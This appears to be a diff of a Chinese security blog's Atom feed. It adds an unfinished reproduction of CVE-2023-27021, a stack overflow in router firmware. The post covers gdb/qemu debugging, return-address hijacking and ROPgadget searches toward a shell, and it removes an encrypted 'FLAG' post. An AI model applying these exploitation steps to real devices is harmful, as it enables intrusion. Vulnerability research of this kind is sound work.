+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509100606754.png&#34; alt=&#34;image-20240509100606754&#34;&gt;&lt;/p&gt;
+&lt;p&gt;所以可以得知存在拒绝服务漏洞。&lt;/p&gt;
+&lt;h3 id=&#34;利用漏洞-gdb调试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用漏洞-gdb调试&#34;&gt;#&lt;/a&gt; 利用漏洞 - gdb 调试&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509075854662.png&#34; alt=&#34;image-20240509075854662&#34;&gt;&lt;/p&gt;
+&lt;p&gt;测试漏洞的保护&lt;/p&gt;
+&lt;p&gt;因为 NX 保护开启，无法向栈上写入 shellcode 去执行。可以去利用 rop，去进行获取 shell&lt;/p&gt;
+&lt;h4 id=&#34;配置gdb动态调试环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#配置gdb动态调试环境&#34;&gt;#&lt;/a&gt; 配置 gdb 动态调试环境&lt;/h4&gt;
+&lt;blockquote&gt;
+&lt;p&gt;sudo chroot ./ ./qemu-arm-static -g 9999 ./bin/httpd&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;开启另一个终端&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;gdb-multiarch ./bin/httpd&lt;/p&gt;
+&lt;p&gt;pwndbg&amp;gt; set architecture arm&lt;/p&gt;
+&lt;p&gt;pwndbg&amp;gt; target remote :9999&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;sudo lsof -i :9999 查看 gdb 绑定端口的 PID&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;这样我们就可以去调试程序了&lt;/p&gt;
+&lt;h4 id=&#34;利用poc去劫持ret&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用poc去劫持ret&#34;&gt;#&lt;/a&gt; 利用 POC 去劫持 ret&lt;/h4&gt;
+&lt;p&gt;进入 gdb 调试后我们先 n 上两步，然后执行 POC 两次，观测 gdb&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509102326859.png&#34; alt=&#34;image-20240509102326859&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现返回地址确实被我们去劫持到一个我们人为输入的值。接下来就是测试我们如何将这个改成一个可获取 shell 的 rop&lt;/p&gt;
+&lt;h3 id=&#34;利用漏洞-获取shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用漏洞-获取shell&#34;&gt;#&lt;/a&gt; 利用漏洞 - 获取 shell&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;获取返回地址据输入偏移量&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509103042769.png&#34; alt=&#34;image-20240509103042769&#34;&gt;&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;寻找 libc 基址&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;使用 vmmap 看内存信息&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509103454383.png&#34; alt=&#34;image-20240509103454383&#34;&gt;&lt;/p&gt;
+&lt;p&gt;猜测箭头所指出为 libc 基址。&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;寻找 gadget&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;使用 ROPgadget，在 libc 中找一个可以控制 r0 的 gadget&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;ROPgadget --binary ./lib/libc.so.0 | grep &amp;quot;mov r0, sp&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509104401520.png&#34; alt=&#34;image-20240509104401520&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;再在 libc 中找一个可以 pop 到 r3 的 gadget&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;ROPgadget --binary ./lib/libc.so.0 --only &amp;quot;pop&amp;quot;|grep r3
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509104744796.png&#34; alt=&#34;image-20240509104744796&#34;&gt;&lt;/p&gt;
+&lt;p&gt;后续补充…&lt;/p&gt;
+</content>
+        <category term="CVE-复现系列" />
+        <updated>2024-05-10T08:11:47.000Z</updated>
+    </entry>
     <entry>
         <id>http://example.com/2024/04/15/%E5%8C%97%E5%8C%BA-%E6%95%B0%E4%BF%A1%E6%9D%AFWP/</id>
         <title>北区-数信杯WP</title>
@@ -103,24 +306,6 @@
 </content>
         <category term="wp" />
         <updated>2024-04-15T08:04:30.000Z</updated>
-    </entry>
-    <entry>
-        <id>http://example.com/2024/03/17/FLAG/</id>
-        <title>FLAG</title>
-        <link rel="alternate" href="http://example.com/2024/03/17/FLAG/"/>
-        <content type="html">&lt;div class=&#34;hbe hbe-container&#34; id=&#34;hexo-blog-encrypt&#34; data-wpm=&#34;抱歉, 这个密码看着不太对, 请再试试.&#34; data-whm=&#34;抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.&#34;&gt;
-  &lt;script id=&#34;hbeData&#34; type=&#34;hbeData&#34; data-hmacdigest=&#34;eb4499412ffec6ef3d2e3d665415ede44858103cb7ccb7b9956f78b21cd8a84c&#34;&gt;0461fee658d425548b2d6811c031f2c83474c92831a87c3449f0026985c7a98c3d3325052f33ff7a694b11947f36f11b261508cf47c0f614c509da88d5a6fdddbc61457d135377c005f9d77ae9b2b652cac179abfa5906612ff1647696e3c6b10e6342c6ec72239560f4808b25d0a81865a330fd1a919376cba19d148c2abfe8e430378a98f53ae2bb7a1d8f92f8e67edf1a6e7a37b6d909d37b63efd1ecfd4afd184511c568de8d85795bd151ad03d0c660bad1777a6170d17336bd4ac639c84f48053b0be0b221925405ec247b88e4c81c4a4318e6cea1cb5cab9a572d45e6e912f62a453593628be59a72b44f43d9d2abfed12a942822c1cdec11c971ef132d34acdbae40573f75c972c34236b702ec2dc1349081fbbeca9cbc77412b2c020d678b8f79667a93c8c098fdb17e9a9ac55f36975c7d8c6988f664df9800d04b61adafdb9c3e502c8641733febebc8a9341faf1fe0fb1a62da7133a43e3095fb3688c0f46ec36d5c2a9d4564a2262b3d212aa0989631e079ae2cf4bce66b9d5a7ce452a5afac0ecc491bb97b0b612eb4449cfa3fa7607b29a3e47de5a38cbebec5c0f7f710dd9c70391b17626ce81c3616b9e673432586f5a55315069f262531bb4193ae36da414eb06ae18ee64d69009e28b30e911cf28996020ae29310a4fea0e3a9276388fdd1a7260902f930ae225cde50e4bd75d09840a2405a0cbbf386d6b31d78f9f11862551f96f35a6d14b6850689872d8ba2c8ae269ef3360eb6904ca434e0862486690841096ec60db21ca2436af5f199550eea8c247638bc83e9157b68c6784a758a1e2be04a0b3de299f5ecbcd1ed65fbff1eea59e01ad1bd718c2db956cc4b812afb550ccfa1de601150b4642c8ab918592ef45d0b19b5c806854eddd446e90a94da4bec9065207a5a4cb62faa48ef864e44d63bc64ff7745695c8dfb486f95f1bc6dee63bb2e5592a24fc35a3c2d5791a5535b12ce755098ea1873e7ac374f9e65b8e7412201e1c93fddba692713c57d618065c5c40b69a0e427f086789f8bc9c0389e3ce55ccd0e38995852147afe1c1ac833574049154a60b775863609d669fd3ab65bd335970c4206b63a34e5d65309fb28b8d5a08099211e819a29c4905b537bb6fbb6f59e80e246e7eb17bf1a90745102ec6c07c3044413fdbfe68628e6bc5b75b01cc12a8b08c4145accaedbe40cba3159a5f73fa3b8f565f710ad66659e00f0e4b8ebea4e1270ec56775da67f1cc9c52b32b99f1e5f3b4432b8e51c4ce9d1fe8c81c7d2816140f14f4b3e48f4dbe1871ae0230dae95e09b551d6f5c1a6e4ac34eacbfa7999b5b046047881a2ff1ce3e31a0a63be0c120ba174185835b9f25a547dae5920ae8e4f30c2947fa7f48f9c358dd3e1847d49d12e03074bcc4e5c0e8432290ed8305f54b592cc615014856469a687b17772ec482f32e0df878df11ccd2cbd6f95f63828901d308917ba68cbbadac034f00cb3786795df02b17a0e506e227f22d7fb06694a3793b5fcd78dd3a95be94993a41cb12439ec8cdfe027c188e144e81d8dd77776b257249f586d3c91bbd2ec7587906127dc9510cf4b734ad95c89b0180e775b17efa172f2614fcd41bdcb7a66291ddd0b65704809af8640828f006711d032badfa6e478ed60ce17143514ea3998979e0c1a2dd13134cfd146490a4a0308ff4535e0488e770a60f48892b0e689e890c227493148be3307a4c3c3e0e939de65f7f60a82f65c8117827503b8c317eb6c432a7934cd74b0b737affef984027d7c7f7e4d1d0e1b28bed013dccd17632a724945585a4e2169202cb09cc36183c0de41da10ebc2cb6a91b8d7243c33252ffcbcf4b19630267c917d99daa5256d43f09c0f8d7b4ccf5ca0a7fde06bd4605bbcecfa74b37b47f6ab98ee9fba853b5b041cbf3c4f3860325dab1bdf5e80c9aab769e69bce6d4e974503bfb9b41328a6a19dc025265d10affe3a78710647fac3d44ec080247f0746d7408c5d857802e93554d24e96705cb7f7f3fc24443191d2c82ca88830bc38537447d9fdbfa52ac8bac58c4382a688f177d029ce25be07d327210a786cb5551501d17e1a277f52ea59d009edb5dba4c2e7e35a8c803fec9949ffff70c2a0c693afb9b451fe9746dafb6b37f7775ab42904da3ac75ac211361e904ef086b721dac0c79ec5c03f5fa89959e7cf83be0b64fe0b378fcf39b62ce8334ddf35562afb46d5b4d0ae95c6b1b162aa1b2e16116d6cdaf87ea0758076d7aee7923eb5afa94763e1ca58ecdaf1cae5da7bc3afcdb79adc7d17bea798c076090655ec632db71534fe29df67ac84c98e8bffdf547ba1ca416d4ff808f0f2e8cc76a413c0a24cb0c8963a240024664510a0c51d26a51687c900b34d21071e14711cbb8818466749dc57ec95cb898f74a9f3379a0d6f8cabb81629a296622aa1ab1ce126ab113edc0b424e925a4af5275e67e3e5fcc3b2af61fe9e5450a2dc6f45f1697216a10d7c87cf7e9668313f4e701b5de95048b19e77bcd2930aacfdcf4b043ac16d389f3b1002d7d37c4fe08851592a72f7aec456e8e32dcdd1b32dbfe9643d0adf10ec8f95158ca1463be57dc638d99b8a9f78302e31979fc54858d8d420c2cfeb855fdea27646274a4616012b4121a38737a9aa9fd91d3570e1518db6579c7f1b3d739cc590e1f0031279e5584634ce681c510f6f9866e89b276e87a395056ff420cf9920f98b44d0880f8b16400c36b69ac6cd56b9b8fe7fa33f4e3ef9038fd182a59a02edf03082cda09ad57084f003dded51b6e14c39bf463c91333045ecdce88f6d50a159e9b18b4ed4f7bf54efed42ede5c32eeb789a437fc5ff66c9aeee149420bd7daae465a1daa95f91ecca808dd8c25f6268ea76e4b08c596e46c86e1ccfcfd63084bdad77c6&lt;/script&gt;
-  &lt;div class=&#34;hbe hbe-content&#34;&gt;
-    &lt;div class=&#34;hbe hbe-input hbe-input-default&#34;&gt;
-      &lt;input class=&#34;hbe hbe-input-field hbe-input-field-default&#34; type=&#34;password&#34; id=&#34;hbePass&#34;&gt;
-      &lt;label class=&#34;hbe hbe-input-label hbe-input-label-default&#34; for=&#34;hbePass&#34;&gt;
-        &lt;span class=&#34;hbe hbe-input-label-content hbe-input-label-content-default&#34;&gt;FLAG就在里面哟！！&lt;/span&gt;
-      &lt;/label&gt;
-    &lt;/div&gt;
-  &lt;/div&gt;
-&lt;/div&gt;
-&lt;script data-pjax src=&#34;/lib/hbe.js&#34;&gt;&lt;/script&gt;&lt;link href=&#34;/css/hbe.style.css&#34; rel=&#34;stylesheet&#34; type=&#34;text/css&#34;&gt;</content>
-        <updated>2024-03-17T01:00:00.000Z</updated>
     </entry>
     <entry>
         <id>http://example.com/2024/03/04/qsnctf-round1-wp/</id>
